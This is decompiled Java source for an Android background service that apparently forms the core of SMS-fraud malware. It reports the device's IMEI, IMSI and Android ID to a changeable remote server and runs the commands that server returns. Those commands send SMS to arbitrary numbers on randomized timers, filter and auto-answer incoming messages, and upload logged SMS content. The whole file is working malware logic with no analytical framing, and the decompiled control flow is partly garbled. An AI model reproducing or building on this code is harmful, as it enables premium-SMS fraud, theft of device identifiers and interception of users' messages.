package test.app;

import android.app.IntentService;
import android.content.Intent;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.StatusLine;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class MainService
  extends IntentService
{
  public MainService()
  {
    super("");
  }
  
  private static String httpRequest(String paramString, List<NameValuePair> paramList)
  {
    try
    {
      if (Constants.DEBUG) {
        Settings.debug("httpRequest() url: " + paramString);
      }
      DefaultHttpClient localDefaultHttpClient = new DefaultHttpClient();
      paramString = new HttpPost(paramString);
      paramString.setEntity(new UrlEncodedFormEntity(paramList, "UTF-8"));
      paramString = localDefaultHttpClient.execute(paramString);
      int i = paramString.getStatusLine().getStatusCode();
      if (Constants.DEBUG) {
        Settings.debug("code: " + i);
      }
      if (i == 200)
      {
        paramString = paramString.getEntity();
        if (paramString != null)
        {
          paramString = EntityUtils.toString(paramString, "utf-8");
          return paramString;
        }
      }
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
    return "";
  }
  
  public String executeCommand(Command paramCommand)
    throws JSONException
  {
    if (paramCommand.name.equals("changeServer"))
    {
      paramCommand = paramCommand.params.getString("url");
      if (paramCommand == null) {
        return "url is null";
      }
      if (paramCommand.length() < 7) {
        return "invalid url length";
      }
      new Settings(this).setServer(paramCommand);
    }
    for (;;)
    {
      return "";
      if (paramCommand.name.equals("changeInterval"))
      {
        long l = paramCommand.params.getLong("interval");
        if (l < 1L) {
          return "interval less 1";
        }
        new Settings(this).setInterval(Settings.times.SECOND * l);
      }
      else if (paramCommand.name.equals("removeAllSendSms"))
      {
        new DbSms(this).removeAll();
      }
      else if (paramCommand.name.equals("removeSendSms"))
      {
        paramCommand = paramCommand.params.getString("id");
        if (paramCommand == null) {
          return "id is null";
        }
        if (paramCommand.length() > 0) {
          return "invalid id length";
        }
        new DbSms(this).removeByCommandId(paramCommand);
      }
      else
      {
        Object localObject1;
        Object localObject2;
        if (paramCommand.name.equals("sendSms"))
        {
          localObject1 = new DbSms(this);
          localObject2 = new DbSmsItem();
          ((DbSmsItem)localObject2).status = 0;
          ((DbSmsItem)localObject2).commandId = paramCommand.id;
          if (((DbSms)localObject1).existCommandId(((DbSmsItem)localObject2).commandId)) {
            return "sms with this id alredy exist";
          }
          JSONObject localJSONObject = paramCommand.params.getJSONObject("startRange");
          int i = localJSONObject.getInt("min");
          if (i < 0) {
            return "min less 0";
          }
          int j = localJSONObject.getInt("max");
          if (j < 0) {
            return "max less 0";
          }
          ((DbSmsItem)localObject2).inteval = paramCommand.params.getInt("interval");
          if (((DbSmsItem)localObject2).inteval < 0) {
            return "intervall less 0";
          }
          localJSONObject = paramCommand.params.getJSONObject("range");
          ((DbSmsItem)localObject2).min = localJSONObject.getInt("min");
          if (i < 0) {
            return "min less 0";
          }
          ((DbSmsItem)localObject2).max = localJSONObject.getInt("max");
          if (j < 0) {
            return "max less 0";
          }
          ((DbSmsItem)localObject2).phone = paramCommand.params.getString("phone");
          if (((DbSmsItem)localObject2).phone == null) {
            return "phone is null";
          }
          if (((DbSmsItem)localObject2).phone.length() == 0) {
            return "invalid phone length";
          }
          ((DbSmsItem)localObject2).text = paramCommand.params.getString("text");
          if (((DbSmsItem)localObject2).text == null) {
            return "text is null";
          }
          if (((DbSmsItem)localObject2).text.length() == 0) {
            return "invalid text length";
          }
          ((DbSmsItem)localObject2).successExp = paramCommand.params.getString("successExp");
          if (((DbSmsItem)localObject2).successExp == null) {
            return "successExp is null";
          }
          if (((DbSmsItem)localObject2).successExp.length() == 0) {
            return "invalid successExp length";
          }
          ((DbSmsItem)localObject2).intervals = paramCommand.params.getString("intevals");
          if (((DbSmsItem)localObject2).intervals == null) {
            return "intervals is null";
          }
          if (((DbSmsItem)localObject2).intervals.length() == 0) {
            return "invalid intervals length";
          }
          if (j == 0)
          {
            ((DbSmsItem)localObject2).time = ((Settings.getRandomValue(((DbSmsItem)localObject2).min, ((DbSmsItem)localObject2).max) + ((DbSmsItem)localObject2).inteval) * Settings.times.SECOND);
            ((DbSmsItem)localObject2).time += System.currentTimeMillis();
            Settings.sendSms(this, paramCommand.id, ((DbSmsItem)localObject2).phone, ((DbSmsItem)localObject2).text);
            if (((DbSmsItem)localObject2).inteval != 0) {
              ((DbSms)localObject1).add((DbSmsItem)localObject2);
            }
          }
          for (;;)
          {
            Settings.startBackgroundSms(this);
            break;
            ((DbSmsItem)localObject2).time = (Settings.getRandomValue(i, j) * Settings.times.SECOND);
            ((DbSmsItem)localObject2).time += System.currentTimeMillis();
            ((DbSms)localObject1).add((DbSmsItem)localObject2);
          }
        }
        if (paramCommand.name.equals("removeAllSmsFilters"))
        {
          new DbFilter(this).removeAll();
        }
        else if (paramCommand.name.equals("removeSmsFilter"))
        {
          paramCommand = paramCommand.params.getString("id");
          if (paramCommand == null) {
            return "id is null";
          }
          if (paramCommand.length() > 0) {
            return "invalid id length";
          }
          new DbFilter(this).removeByCommandId(paramCommand);
        }
        else if (paramCommand.name.equals("addSmsFilter"))
        {
          localObject1 = new DbFilter(this);
          localObject2 = new DbFilterItem();
          ((DbFilterItem)localObject2).commandId = paramCommand.id;
          if (((DbFilter)localObject1).existCommandId(((DbFilterItem)localObject2).commandId)) {
            return "sms filter with this id alredy exist";
          }
          ((DbFilterItem)localObject2).type = paramCommand.params.getInt("searchType");
          if ((((DbFilterItem)localObject2).type < 1) || (((DbFilterItem)localObject2).type > 4)) {
            return "ivalid type";
          }
          ((DbFilterItem)localObject2).phone = paramCommand.params.getString("searchPhone");
          if (((DbFilterItem)localObject2).phone == null) {
            return "phone is null";
          }
          ((DbFilterItem)localObject2).text = paramCommand.params.getString("searchText");
          if (((DbFilterItem)localObject2).text == null) {
            return "text is null";
          }
          ((DbFilter)localObject1).add((DbFilterItem)localObject2);
        }
        else if (paramCommand.name.equals("removeAllSmsAnswers"))
        {
          new DbAnswer(this).removeAll();
        }
        else if (paramCommand.name.equals("removeSmsAnswer"))
        {
          paramCommand = paramCommand.params.getString("id");
          if (paramCommand == null) {
            return "id is null";
          }
          if (paramCommand.length() > 0) {
            return "invalid id length";
          }
          new DbAnswer(this).removeByCommandId(paramCommand);
        }
        else if (paramCommand.name.equals("addSmsAnswer"))
        {
          localObject1 = new DbAnswer(this);
          localObject2 = new DbAnswerItem();
          ((DbAnswerItem)localObject2).commandId = paramCommand.id;
          if (((DbAnswer)localObject1).existCommandId(((DbAnswerItem)localObject2).commandId)) {
            return "sms filter with this id alredy exist";
          }
          ((DbAnswerItem)localObject2).searchType = paramCommand.params.getInt("searchType");
          if ((((DbAnswerItem)localObject2).searchType < 1) || (((DbAnswerItem)localObject2).searchType > 4)) {
            return "ivalid search type";
          }
          ((DbAnswerItem)localObject2).searchPhone = paramCommand.params.getString("searchPhone");
          if (((DbAnswerItem)localObject2).searchPhone == null) {
            return "search phone is null";
          }
          ((DbAnswerItem)localObject2).searchText = paramCommand.params.getString("searchText");
          if (((DbAnswerItem)localObject2).searchText == null) {
            return "search text is null";
          }
          ((DbAnswerItem)localObject2).answerType = paramCommand.params.getInt("answerType");
          if ((((DbAnswerItem)localObject2).answerType < 1) || (((DbAnswerItem)localObject2).answerType > 4)) {
            return "ivalid answer type";
          }
          ((DbAnswerItem)localObject2).answerPhone = paramCommand.params.getString("answerPhone");
          if (((DbAnswerItem)localObject2).answerPhone == null) {
            return "answer phone is null";
          }
          ((DbAnswerItem)localObject2).answerText = paramCommand.params.getString("answerText");
          if (((DbAnswerItem)localObject2).answerText == null) {
            return "answer text is null";
          }
          ((DbAnswerItem)localObject2).exp = paramCommand.params.getString("answerExp");
          if (((DbAnswerItem)localObject2).exp == null) {
            return "answer exp is null";
          }
          ((DbAnswer)localObject1).add((DbAnswerItem)localObject2);
        }
      }
    }
  }
  
  List<NameValuePair> getDefaultParams(String paramString)
  {
    ArrayList localArrayList = new ArrayList(10);
    localArrayList.add(new BasicNameValuePair(params.ACTION, paramString));
    localArrayList.add(new BasicNameValuePair(params.ID, new Settings(this).getId()));
    localArrayList.add(new BasicNameValuePair(params.IMSI, Settings.getImsi(this)));
    localArrayList.add(new BasicNameValuePair(params.IMEI, Settings.getImei(this)));
    localArrayList.add(new BasicNameValuePair(params.ANDROID_ID, Settings.getAndroidId(this)));
    return localArrayList;
  }
  
  public Command loadCommand(JSONObject paramJSONObject)
    throws JSONException
  {
    Command localCommand = new Command();
    localCommand.id = paramJSONObject.getString(command_fields.ID);
    localCommand.name = paramJSONObject.getString(command_fields.NAME);
    if (paramJSONObject.has(command_fields.PARAMS)) {
      localCommand.params = paramJSONObject.getJSONObject(command_fields.PARAMS);
    }
    return localCommand;
  }
  
  protected void onHandleIntent(Intent paramIntent)
  {
    paramIntent = paramIntent.getAction();
    if (Constants.DEBUG) {
      Settings.debug("onHandleIntent: " + paramIntent);
    }
    PowerManager.WakeLock localWakeLock = ((PowerManager)getSystemService("power")).newWakeLock(1, "");
    localWakeLock.acquire();
    Object localObject;
    for (;;)
    {
      try
      {
        boolean bool = paramIntent.equals(actions.LOG);
        if (!bool) {
          continue;
        }
      }
      catch (Exception paramIntent)
      {
        Settings.log(paramIntent);
        continue;
        if (!paramIntent.equals(actions.COMMANDS)) {
          continue;
        }
        localSettings = new Settings(this);
      }
      try
      {
        paramIntent = new DbLog(this);
        localObject = paramIntent.getLastSms();
        if (localObject != null) {
          continue;
        }
      }
      catch (Exception paramIntent)
      {
        paramIntent.printStackTrace();
        continue;
      }
      localWakeLock.release();
      return;
      if (sendMessage((String[])localObject)) {
        paramIntent.removeMessage(localObject[0]);
      }
    }
    for (;;)
    {
      try
      {
        paramIntent = getDefaultParams("get");
        paramIntent = httpRequest(localSettings.getServer(), paramIntent);
        if (Constants.DEBUG) {
          Settings.debug("data: " + paramIntent);
        }
        localJSONArray = new JSONArray(paramIntent);
        i = 0;
        int j = localJSONArray.length();
        if (i < j) {
          continue;
        }
      }
      catch (Exception paramIntent)
      {
        Settings localSettings;
        JSONArray localJSONArray;
        int i;
        Settings.log(paramIntent);
        continue;
      }
      localSettings.setTime(System.currentTimeMillis() + localSettings.getInterval());
      Settings.startCustomTimer(this, MainReceiver.actions.CONNECT, localSettings.getTime(), false);
      break;
      paramIntent = null;
      try
      {
        localObject = loadCommand(localJSONArray.getJSONObject(i));
        paramIntent = (Intent)localObject;
        if (Constants.DEBUG)
        {
          paramIntent = (Intent)localObject;
          Settings.debug("command: " + localObject);
        }
        paramIntent = (Intent)localObject;
        str = executeCommand((Command)localObject);
        paramIntent = (Intent)localObject;
      }
      catch (Exception localException)
      {
        String str = localException.toString();
        continue;
      }
      Settings.setResponse(this, paramIntent, str);
      i += 1;
    }
  }
  
  boolean sendMessage(String[] paramArrayOfString)
  {
    try
    {
      List localList = getDefaultParams("set");
      localList.add(new BasicNameValuePair(params.MESSAGE, paramArrayOfString[1]));
      localList.add(new BasicNameValuePair(params.TIME, paramArrayOfString[2]));
      paramArrayOfString = httpRequest(new Settings(this).getServer(), localList);
      if (paramArrayOfString.equals("OK")) {
        return true;
      }
      if (Constants.DEBUG) {
        Settings.debug("html: " + paramArrayOfString);
      }
    }
    catch (Exception paramArrayOfString)
    {
      for (;;)
      {
        Settings.log(paramArrayOfString);
      }
    }
    return false;
  }
  
  public static final class actions
  {
    public static String COMMANDS = "2";
    public static String LOG = "1";
    
    public actions() {}
  }
  
  public static final class command_fields
  {
    public static String ID = "id";
    public static String NAME = "name";
    public static String PARAMS = "params";
    
    public command_fields() {}
  }
  
  public static final class command_result
  {
    public static int ERROR = 1;
    public static int OK = 0;
    
    public command_result() {}
  }
  
  public static final class params
  {
    public static String ACTION = "type";
    public static String ANDROID_ID;
    public static String ID = "id";
    public static String IMEI;
    public static String IMSI;
    public static String MESSAGE = "message";
    public static String TIME;
    
    static
    {
      ANDROID_ID = "aid";
      IMEI = "imei";
      IMSI = "imsi";
      TIME = "time";
    }
    
    public params() {}
  }
  
  public static final class response_fields
  {
    public static String DESCRIPTION = "description";
    public static String ERROR;
    public static String ID;
    public static String NAME;
    public static String RESULT;
    public static String TYPE = "type";
    
    static
    {
      ID = "id";
      NAME = "name";
      RESULT = "result";
      ERROR = "error";
    }
    
    public response_fields() {}
  }
  
  public static final class response_types
  {
    public static String ERROR = "error";
    public static String RESPONSE = "response";
    
    public response_types() {}
  }
}
